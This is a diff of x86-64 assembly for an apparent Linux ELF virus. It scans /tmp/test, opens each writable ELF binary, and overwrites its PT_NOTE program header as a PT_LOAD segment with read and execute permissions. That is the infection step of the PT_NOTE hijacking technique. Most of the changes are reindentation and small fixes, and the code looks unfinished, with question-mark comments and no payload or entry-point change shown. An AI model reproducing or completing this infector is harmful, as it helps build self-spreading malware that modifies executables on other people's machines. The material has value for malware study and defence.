@@ -93,10 +93,10 @@ _folder_to_infect:
 	mov qword [r15 + 4], '/tes'
 	mov qword [r15 + 8], 0x00000074                ; assigning /tmp/test to the beginning of the r15 register
 
-	mov rdi, r15                                   ; ?????????????
-	mov [r15 + 16], rax
-	test rax, rax
-	js _end                                        ; if open fails, exit silently ??
+	; mov rdi, r15                                   ; ?????????????
+	; mov [r15 + 16], rax
+	; test rax, rax
+	; js _end                                        ; if open fails, exit silently ??
 
 _folder_stat:
 	mov rdi, r15
@@ -140,107 +140,107 @@ _dirent_tmp_test:                                 ; getdents the directory to it
 
 	xor r14, r14                                  ; i = 0 for the first iteration
 	mov r13, rax                                  ; r13 stores the number of read bytes with getdents
-_dirent_loop:
-	movzx r12d, word [r15 + 192 + r14]
+	_dirent_loop:
+		movzx r12d, word [r15 + 192 + r14]
 
-_stat_file:
-	lea rdi, [r15 + 195 + r14]                    ; stat over every file
-	lea rsi, [r15 + 32]
-	mov rax, SYS_STAT
-	syscall
+	_stat_file:
+		lea rdi, [r15 + 195 + r14]                    ; stat over every file
+		lea rsi, [r15 + 32]
+		mov rax, SYS_STAT
+		syscall
 
-_check_file_flags:                                ; check if if the program can read and write over the binary
-	lea rax, [r15 + 56]
-	mov rcx, [rax]
-	and rcx, S_IRUSR                              ; rcx & S_IRUSR == 1
-	test rcx, rcx
-	jz _continue_dirent
+	_check_file_flags:                                ; check if if the program can read and write over the binary
+		lea rax, [r15 + 56]
+		mov rcx, [rax]
+		and rcx, S_IRUSR                              ; rcx & S_IRUSR == 1
+		test rcx, rcx
+		jz _continue_dirent
 
-	lea rax, [r15 + 56]  
-	mov rcx, [rax]
-	and rcx, S_IWUSR                               ; rcx & S_IWUSR == 1
-	test rcx, rcx
-	jz _continue_dirent
+		lea rax, [r15 + 56]  
+		mov rcx, [rax]
+		and rcx, S_IWUSR                               ; rcx & S_IWUSR == 1
+		test rcx, rcx
+		jz _continue_dirent
 
-	lea rax, [r15 + 56]
-	mov rcx, [rax]
-	mov rdx, S_IFDIR
-	and rcx, S_IFMT
-	cmp rdx, rcx
-	je _continue_dirent                           ; checks if its a directory, if so, jump to the next binary of the dirent
+		lea rax, [r15 + 56]
+		mov rcx, [rax]
+		mov rdx, S_IFDIR
+		and rcx, S_IFMT
+		cmp rdx, rcx
+		je _continue_dirent                           ; checks if its a directory, if so, jump to the next binary of the dirent
 
-	cmp dword [r15 + 80], 64                      ; checks that the file is at least as big as an ELF header
-	jl _continue_dirent
+		cmp dword [r15 + 80], 64                      ; checks that the file is at least as big as an ELF header
+		jl _continue_dirent
 
-_open_bin:
-	lea rdi, [r15 + 195 + r14]
-	mov rsi, 0x0002                               ; O_RDWR 
-	mov rdx, 0644o
-	mov rax, SYS_OPEN                             ; open ( dirent->d_name, O_RDWR )
-	syscall
+	_open_bin:
+		lea rdi, [r15 + 195 + r14]
+		mov rsi, 0x0002                               ; O_RDWR 
+		mov rdx, 0644o
+		mov rax, SYS_OPEN                             ; open ( dirent->d_name, O_RDWR )
+		syscall
 
-	mov qword [r15 + 1420], rax                   ; save binary fd
-	mov rdi, rax                                  ; rax contains fd
-	lea rsi, [r15 + 1300]                         ; rsi = ehdr
-	mov rdx, EHDR_SIZE			                  ; ehdr.size
-	mov r10, 0                                    ; read at offset 0
-	mov rax, SYS_PREAD64
-	syscall
+		mov qword [r15 + 1420], rax                   ; save binary fd
+		mov rdi, rax                                  ; rax contains fd
+		lea rsi, [r15 + 1300]                         ; rsi = ehdr
+		mov rdx, EHDR_SIZE			                  ; ehdr.size
+		mov r10, 0                                    ; read at offset 0
+		mov rax, SYS_PREAD64
+		syscall
 
-_is_elf:
-	cmp byte [r15 + 1300], 0x464c457f             ; check if the file starts with 177ELF what indicates it is an ELF binary
-	jne _close_bin
+	_is_elf:
+		cmp dword [r15 + 1300], 0x464c457f             ; check if the file starts with 177ELF what indicates it is an ELF binary
+		jne _close_bin
 
-_save_entry_dpuente:  ;; very important!!!
-	xor rax, rax
+	_save_entry_dpuente:  ;; very important!!!
+		xor rax, rax
 
-	mov byte [r15 + 1484], 0                      ; i = 0, iterate over all ELF program headers
-_read_phdr:
-	mov word r9w, [r15 + 1484]
-	cmp word [r15 + 1356], r9w
-	je _close_bin                                 ; check if all the headers have been read
+		mov byte [r15 + 1484], 0                      ; i = 0, iterate over all ELF program headers
+		_read_phdr:
+			mov word r9w, [r15 + 1484]
+			cmp word [r15 + 1356], r9w
+			je _close_bin                                 ; check if all the headers have been read
 
-	lea rsi, [r15 + 1424]
-	mov rdx, PHDR_SIZE
-	mov r10, [r15 + 1484]
-	imul r10, r10, PHDR_SIZE
-	add r10, EHDR_SIZE
-	mov rax, SYS_PREAD64
-	syscall
+			lea rsi, [r15 + 1424]
+			mov rdx, PHDR_SIZE
+			mov r10, [r15 + 1484]
+			imul r10, r10, PHDR_SIZE
+			add r10, EHDR_SIZE
+			mov rax, SYS_PREAD64
+			syscall
 
-	cmp word [r15 + 1424], PT_NOTE                ; phdr->type
-	jne _next_phdr                                ; if it is not a PT_NOTE header, continue to check the next one
+			cmp word [r15 + 1424], PT_NOTE                ; phdr->type
+			jne _next_phdr                                ; if it is not a PT_NOTE header, continue to check the next one
 
-_change_ptnote_to_ptload:
-	mov dword [r15 + 1424], PT_LOAD               ; change PT_NOTE header to PT_LOAD
+		_change_ptnote_to_ptload:
+			mov dword [r15 + 1424], PT_LOAD               ; change PT_NOTE header to PT_LOAD
 
-_change_mem_protections:
-	mov dword [r15 + 1428], PF_R | PF_X           ; disable memory protections
+		_change_mem_protections:
+			mov dword [r15 + 1428], PF_R | PF_X           ; disable memory protections
 
-_write_header_changes_to_bin:                     ; writes new header modifications to the binary
-	mov rdi, [r15 + 1420]
-	lea rsi, [r15 + 1424]
-	mov rdx, PHDR_SIZE
-	; mov r10, r10 ????????
-	mov rax, SYS_PWRITE64
-	syscall
+		_write_header_changes_to_bin:                     ; writes new header modifications to the binary
+			mov rdi, [r15 + 1420]
+			lea rsi, [r15 + 1424]
+			mov rdx, PHDR_SIZE
+			; mov r10, r10 ????????
+			mov rax, SYS_PWRITE64
+			syscall
 
-	jmp _close_bin
+			jmp _close_bin
 
-_next_phdr:
-	inc word [r15 + 1484]
-	jmp _read_phdr
+		_next_phdr:
+			inc word [r15 + 1484]
+			jmp _read_phdr
 
-_close_bin:
-	mov qword rdi,[ r15 + 1420]
-	mov rax, SYS_CLOSE
-	syscall
+	_close_bin:
+		mov qword rdi,[ r15 + 1420]
+		mov rax, SYS_CLOSE
+		syscall
 
-_continue_dirent:
-	add r14, r12
-	cmp r14, r13
-	jne _dirent_loop                              ; if it has still files to read continues to the next one
-	jmp _dirent_tmp_test                          ; else, do the getdents again
+	_continue_dirent:
+		add r14, r12
+		cmp r14, r13
+		jne _dirent_loop                              ; if it has still files to read continues to the next one
+		jmp _dirent_tmp_test                          ; else, do the getdents again
 
 _close_folder:
 	mov rdi, [r15 + 16]
